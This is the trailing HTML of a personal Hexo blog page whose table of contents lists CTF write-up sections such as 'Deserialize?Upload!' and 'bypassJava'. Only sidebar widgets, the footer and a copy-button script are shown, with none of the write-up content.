23.25333334-45.97333334 30.08-69.33333335 15.14666667l-274.66666666-176c-23.36000001-14.93333333-30.08-45.97333334-15.14666667-69.33333333l27.09333334-42.24000001c14.93333333-23.36000001 46.08000001-30.08 69.33333333-15.14666666z" fill="currentColor"></path>
</svg>
    <span>TOC</span>
  </div>
  <div class="widget-body">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#das0raysxcbctf"><span class="toc-number">1.</span> <span class="toc-text"> DAS0RAYSxCBCTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">2.</span> <span class="toc-text"> å†™åœ¨å‰é¢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#yet-another-box"><span class="toc-number">3.</span> <span class="toc-text"> yet another box</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nps"><span class="toc-number">4.</span> <span class="toc-text"> nps</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#deserializeupload"><span class="toc-number">5.</span> <span class="toc-text"> Deserialize?Upload!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dasctfxcbctf_2023_bypassjava"><span class="toc-number">6.</span> <span class="toc-text"> DASCTFXCBCTF_2023_bypassJava</span></a></li></ol>
    
  </div>
</section>


      
<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
</svg>
    <span>NOTICE</span>
  </div>
  <div class="widget-body">
    <p>å›ã®çŸ¥ã‚‰ãªã„ç‰©èª</p>
  </div>
</section>


      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
    <span>CATEGORYS</span>
  </div>
  <div class="widget-body">
    <ul class="categorys-list">
      
    </ul>
  </div>
</section>

      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
    <span>TAGS</span>
  </div>
  <div class="widget-body">
    <div class="tags-cloud">
      <a href="/tags/CTF/" style="font-size: 20px;" class="tags-cloud-10">CTF</a> <a href="/tags/WP/" style="font-size: 10px;" class="tags-cloud-0">WP</a>
    </div>
  </div>
</section>
    </div>
  </article>
</div>

    <!-- footer container -->
<footer id="footer" class="footer">
  <div class="footer-container">
    
    <div class="social-icons">
      
        
          <a href="https://github.com/1llustrious" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
</svg>
          </a>
        
      
    </div>
     
    <p>Â© 2023 <a href="/" target="_blank">1llustrious</a></p>

    

    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>

    <p>
      <a href="javascript:;" id="theme-light">ğŸŒ æµ…è‰²</a>
      <a href="javascript:;" id="theme-dark">ğŸŒ› æ·±è‰²</a>
      <a href="javascript:;" id="theme-auto">ğŸ¤–ï¸ è‡ªåŠ¨</a>
    </p>
  </div>
</footer>
  </div>

  <div class="back-to-top-fixed soft-size--round soft-style--box">
    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
    </svg>
  </div>

  
  <!-- aplayer -->


<!-- dplayer -->


<!-- copy button  -->
<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>

<!-- https://clipboardjs.com/ -->


<script type="text/javascript">
	(function () {
		function getCodeType (elem) {
			const classs = Array.from(elem.classList.values());
			if (classs && classs.length > 1) {
				return classs[1];
			}
			return "plain";
		}

		window.addEventListener("DOMContentLoaded", () => {
			const copyBtnClass = "copy-btn";
			//  instantiate clipboardjs 
			const clipboard = new ClipboardJS('.' + copyBtnClass);

			clipboard.on('success', function (e) {
				console.info('Action:', e.action);
				console.info('Text:', e.text);
				console.info('Trigger:', e.trigger);
				if (e.trigger) {
					e.trigger.classList.add("copied");
					setTimeout(() => {
						e.trigger.classList.remove("copied");
					}, 3000);
				}
				e.clearSelection();
			});

			clipboard.on('error', function (e) {
				console.error('Action:', e.action);
				console.error('Trigger:', e.trigger);
			});

			document.querySelectorAll('figure.highlight').forEach((elem) => {
				const codeContent = elem.querySelector("td.code");
				const copyButton = document.createElement('button');
				copyButton.setAttribute("class", copyBtnClass);
				copyButton.setAttribute("title", "Copy Code");
				copyButton.setAttribute("data-clipboard-text", codeContent.innerText);
				elem.insertBefore(copyButton, elem.children[0]);
			});
		})
	})();
</script>








  


  


  







  
  <!-- å°¾éƒ¨ç”¨æˆ·è‡ªå®šä¹‰ç›¸å…³å†…å®¹ -->


<script src="/bundle.js"></script></body></html>